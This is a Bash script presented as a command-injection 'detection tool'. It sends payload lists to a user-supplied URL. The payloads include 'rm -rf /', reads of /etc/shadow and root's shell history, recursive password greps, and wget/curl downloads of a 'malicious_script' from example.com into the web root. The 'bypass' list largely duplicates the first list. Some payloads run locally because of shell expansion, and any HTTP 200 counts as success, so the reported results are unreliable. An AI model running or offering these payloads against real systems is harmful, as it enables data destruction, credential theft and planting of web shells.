#!/bin/bash
# This is a comment

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
NC='\033[0m' # No Color

# Function to perform OS Command Injection detection
detect_os_command_injection() {
    echo "Detecting OS Command Injection vulnerabilities..."
    # Define OS Command Injection payloads
    payloads=(";ls" ";cat /etc/passwd" "| ls" "$(ls)" "$(cat /etc/passwd)" "|whoami" ";id" "|id" ";uname -a" "|uname -a" ";echo test" "|echo test" ";which curl" "|which curl" ";ls -la" "|ls -la" ";ps aux" "|ps aux" ";netstat -tuln" "|netstat -tuln" ";df -h" "|df -h" ";uptime" "|uptime" ";date" "|date" ";ifconfig" "|ifconfig" ";hostname" "|hostname" ";echo 'hello'" "|echo 'hello'" ";wget http://example.com/malicious_script.sh" "|wget http://example.com/malicious_script.sh" ";curl http://example.com/malicious_script.sh -o malicious_script.sh" "|curl http://example.com/malicious_script.sh -o malicious_script.sh" ";rm -rf /" "|rm -rf /" ";rm -rf /*" "|rm -rf /*" ";cat /proc/cpuinfo" "|cat /proc/cpuinfo" ";cat /proc/meminfo" "|cat /proc/meminfo" ";cat /etc/hosts" "|cat /etc/hosts" ";cat /etc/passwd | grep root" "|cat /etc/passwd | grep root" ";find / -type f -name '*.log'" "|find / -type f -name '*.log'" ";find / -type f -name '*.conf'" "|find / -type f -name '*.conf'" ";find / -type f -name '*.xml'" "|find / -type f -name '*.xml'" ";find / -type f -name '*.json'" "|find / -type f -name '*.json'" ";cat /etc/shadow" "|cat /etc/shadow" ";mysql --version" "|mysql --version" ";psql --version" "|psql --version" ";python --version" "|python --version" ";perl --version" "|perl --version" ";ruby --version" "|ruby --version" ";gcc --version" "|gcc --version" ";java --version" "|java --version" ";ping -c 4 google.com" "|ping -c 4 google.com" ";touch testfile" "|touch testfile" ";chmod 777 testfile" "|chmod 777 testfile" ";echo '<?php phpinfo(); ?>' > testfile.php" "|echo '<?php phpinfo(); ?>' > testfile.php" ";cat testfile.php" "|cat testfile.php" ";rm testfile.php" "|rm testfile.php" ";grep -R 'password' /" "|grep -R 'password' /" ";grep -R 'password' /etc/" "|grep -R 'password' /etc/" ";tail -n 10 /var/log/syslog" "|tail -n 10 /var/log/syslog" ";tail -n 10 /var/log/messages" "|tail -n 10 /var/log/messages" ";tail -n 10 /var/log/auth.log" "|tail -n 10 /var/log/auth.log" ";tail -n 10 /var/log/dmesg" "|tail -n 10 /var/log/dmesg" ";tail -n 10 /var/log/boot.log" "|tail -n 10 /var/log/boot.log" ";tail -n 10 /var/log/kern.log" "|tail -n 10 /var/log/kern.log" ";tail -n 10 /var/log/lastlog" "|tail -n 10 /var/log/lastlog" ";tail -n 10 /var/log/wtmp" "|tail -n 10 /var/log/wtmp" ";tail -n 10 /var/log/btmp" "|tail -n 10 /var/log/btmp" ";grep -R 'root' /etc/passwd" "|grep -R 'root' /etc/passwd" ";grep -R 'admin' /etc/passwd" "|grep -R 'admin' /etc/passwd" ";grep -R '123456' /etc/passwd" "|grep -R '123456' /etc/passwd" ";grep -R 'password' /etc/shadow" "|grep -R 'password' /etc/shadow" ";grep -R 'admin' /etc/shadow" "|grep -R 'admin' /etc/shadow" ";grep -R '123456' /etc/shadow" "|grep -R '123456' /etc/shadow")

    # Iterate over payloads and inject them into vulnerable parameters
    for payload in "${payloads[@]}"; do
        echo -e "Testing payload: ${RED}$payload${NC}"
        url="$1?param=$payload"
        response=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$url")
        if [ $response -eq 200 ]; then
            echo -e "${GREEN}Payload ran successfully.${NC} URL: $url, Response Code: $response"
        else
            echo -e "${YELLOW}Payload failed to execute.${NC} URL: $url, Response Code: $response"
        fi
    done
}

# Function to attempt bypassing protection systems
bypass_protection_systems() {
    echo "Attempting to bypass protection systems..."
    # Define bypass techniques
    bypass_techniques=(";ls" ";cat /etc/passwd" "| ls" "$(ls)" "$(cat /etc/passwd)" "|whoami" ";id" "|id" ";uname -a" "|uname -a" ";echo test" "|echo test" ";which curl" "|which curl" ";ls -la" "|ls -la" ";ps aux" "|ps aux" ";netstat -tuln" "|netstat -tuln" ";df -h" "|df -h" ";uptime" "|uptime" ";date" "|date" ";ifconfig" "|ifconfig" ";hostname" "|hostname" ";echo 'hello'" "|echo 'hello'" ";wget http://example.com/malicious_script.sh" "|wget http://example.com/malicious_script.sh" ";curl http://example.com/malicious_script.sh -o malicious_script.sh" "|curl http://example.com/malicious_script.sh -o malicious_script.sh" ";rm -rf /" "|rm -rf /" ";rm -rf /*" "|rm -rf /*" ";cat /proc/cpuinfo" "|cat /proc/cpuinfo" ";cat /proc/meminfo" "|cat /proc/meminfo" ";cat /etc/hosts" "|cat /etc/hosts" ";cat /etc/passwd | grep root" "|cat /etc/passwd | grep root" ";find / -type f -name '*.log'" "|find / -type f -name '*.log'" ";find / -type f -name '*.conf'" "|find / -type f -name '*.conf'" ";find / -type f -name '*.xml'" "|find / -type f -name '*.xml'" ";find / -type f -name '*.json'" "|find / -type f -name '*.json'" ";cat /etc/shadow" "|cat /etc/shadow" ";mysql --version" "|mysql --version" ";psql --version" "|psql --version" ";python --version" "|python --version" ";perl --version" "|perl --version" ";ruby --version" "|ruby --version" ";gcc --version" "|gcc --version" ";java --version" "|java --version" ";ping -c 4 google.com" "|ping -c 4 google.com" ";touch testfile" "|touch testfile" ";chmod 777 testfile" "|chmod 777 testfile" ";echo '<?php phpinfo(); ?>' > testfile.php" "|echo '<?php phpinfo(); ?>' > testfile.php" ";cat testfile.php" "|cat testfile.php" ";rm testfile.php" "|rm testfile.php" ";grep -R 'password' /" "|grep -R 'password' /" ";grep -R 'password' /etc/" "|grep -R 'password' /etc/" ";tail -n 10 /var/log/syslog" "|tail -n 10 /var/log/syslog" ";tail -n 10 /var/log/messages" "|tail -n 10 /var/log/messages" ";tail -n 10 /var/log/auth.log" "|tail -n 10 /var/log/auth.log" ";tail -n 10 /var/log/dmesg" "|tail -n 10 /var/log/dmesg" ";tail -n 10 /var/log/boot.log" "|tail -n 10 /var/log/boot.log" ";tail -n 10 /var/log/kern.log" "|tail -n 10 /var/log/kern.log" ";tail -n 10 /var/log/lastlog" "|tail -n 10 /var/log/lastlog" ";tail -n 10 /var/log/wtmp" "|tail -n 10 /var/log/wtmp" ";tail -n 10 /var/log/btmp" "|tail -n 10 /var/log/btmp" ";grep -R 'root' /etc/passwd" "|grep -R 'root' /etc/passwd" ";grep -R 'admin' /etc/passwd" "|grep -R 'admin' /etc/passwd" ";grep -R '123456' /etc/passwd" "|grep -R '123456' /etc/passwd" ";grep -R 'password' /etc/shadow" "|grep -R 'password' /etc/shadow" ";grep -R 'admin' /etc/shadow" "|grep -R 'admin' /etc/shadow" ";grep -R '123456' /etc/shadow" "|grep -R '123456' /etc/shadow" ";wget https://example.com/malicious_script.sh -O malicious_script.sh" "|wget https://example.com/malicious_script.sh -O malicious_script.sh" ";curl https://example.com/malicious_script.sh -o malicious_script.sh" "|curl https://example.com/malicious_script.sh -o malicious_script.sh" ";ls -alh /var/www/html" "|ls -alh /var/www/html" ";cat /var/www/html/index.html" "|cat /var/www/html/index.html" ";echo '<?php echo \"Hello, World!\"; ?>' > /var/www/html/hello.php" "|echo '<?php echo \"Hello, World!\"; ?>' > /var/www/html/hello.php" ";wget https://example.com/malicious_script.php -O /var/www/html/malicious_script.php" "|wget https://example.com/malicious_script.php -O /var/www/html/malicious_script.php" ";curl https://example.com/malicious_script.php -o /var/www/html/malicious_script.php" "|curl https://example.com/malicious_script.php -o /var/www/html/malicious_script.php" ";ls -alh /home" "|ls -alh /home" ";cat /home/user/.bash_history" "|cat /home/user/.bash_history" ";cat /root/.bash_history" "|cat /root/.bash_history" ";ls -alh /root" "|ls -alh /root" ";ls -alh /var/log" "|ls -alh /var/log" ";cat /var/log/apache2/access.log" "|cat /var/log/apache2/access.log" ";cat /var/log/apache2/error.log" "|cat /var/log/apache2/error.log" ";cat /var/log/apache/access.log" "|cat /var/log/apache/access.log" ";cat /var/log/apache/error.log" "|cat /var/log/apache/error.log" ";cat /etc/httpd/access.log" "|cat /etc/httpd/access.log" ";cat /etc/httpd/error.log" "|cat /etc/httpd/error.log" ";cat /etc/httpd/logs/access_log" "|cat /etc/httpd/logs/access_log" ";cat /etc/httpd/logs/error_log" "|cat /etc/httpd/logs/error_log" ";cat /var/log/nginx/access.log" "|cat /var/log/nginx/access.log" ";cat /var/log/nginx/error.log" "|cat /var/log/nginx/error.log" ";cat /etc/nginx/access.log" "|cat /etc/nginx/access.log" ";cat /etc/nginx/error.log" "|cat /etc/nginx/error.log" ";cat /usr/local/nginx/access.log" "|cat /usr/local/nginx/access.log" ";cat /usr/local/nginx/error.log" "|cat /usr/local/nginx/error.log" ";cat /etc/nginx/logs/access.log" "|cat /etc/nginx/logs/access.log" ";cat /etc/nginx/logs/error.log" "|cat /etc/nginx/logs/error.log" ";cat /usr/local/apache/logs/access_log" "|cat /usr/local/apache/logs/access_log" ";cat /usr/local/apache/logs/error_log" "|cat /usr/local/apache/logs/error_log" ";cat /var/log/vsftpd.log" "|cat /var/log/vsftpd.log" ";cat /var/log/sshd.log" "|cat /var/log/sshd.log" ";cat /var/log/auth.log" "|cat /var/log/auth.log" ";cat /var/log/syslog" "|cat /var/log/syslog" ";cat /var/log/messages" "|cat /var/log/messages" ";cat /var/log/httpd/access_log" "|cat /var/log/httpd/access_log" ";cat /var/log/httpd/error_log" "|cat /var/log/httpd/error_log" ";cat /var/log/maillog" "|cat /var/log/maillog" ";cat /var/log/exim_mainlog" "|cat /var/log/exim_mainlog" ";cat /var/log/exim_paniclog" "|cat /var/log/exim_paniclog" ";cat /var/log/mysqld.log" "|cat /var/log/mysqld.log" ";cat /var/log/secure" "|cat /var/log/secure" ";cat /var/log/mysqld/error.log" "|cat /var/log/mysqld/error.log" ";cat /var/log/faillog" "|cat /var/log/faillog" ";cat /var/log/cron" "|cat /var/log/cron" ";cat /var/log/mail" "|cat /var/log/mail" ";cat /var/log/spooler" "|cat /var/log/spooler" ";cat /var/log/boot.log" "|cat /var/log/boot.log")

    # Iterate over bypass techniques and inject them into vulnerable parameters
    for bypass in "${bypass_techniques[@]}"; do
        echo -e "Testing bypass technique: ${RED}$bypass${NC}"
        url="$1?param=$bypass"
        response=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$url")
        if [ $response -eq 200 ]; then
            echo -e "${GREEN}Bypass successful.${NC} URL: $url, Response Code: $response"
        else
            echo -e "${YELLOW}Bypass failed.${NC} URL: $url, Response Code: $response"
        fi
    done
}

# Main function
main() {
    echo -e "${GREEN}OS Command Injection Detection Tool${NC}"
    echo "----------------------------------"

    # Prompt user for target URL
    read -p "Enter your target URL: " target_url

    # Validate input
    if [ -z "$target_url" ]; then
        echo -e "${RED}Target URL cannot be empty.${NC}"
        exit 1
    fi

    # Perform OS Command Injection detection
    detect_os_command_injection "$target_url"

    # Attempt to bypass protection systems
    bypass_protection_systems "$target_url"
}

# Call main function
main
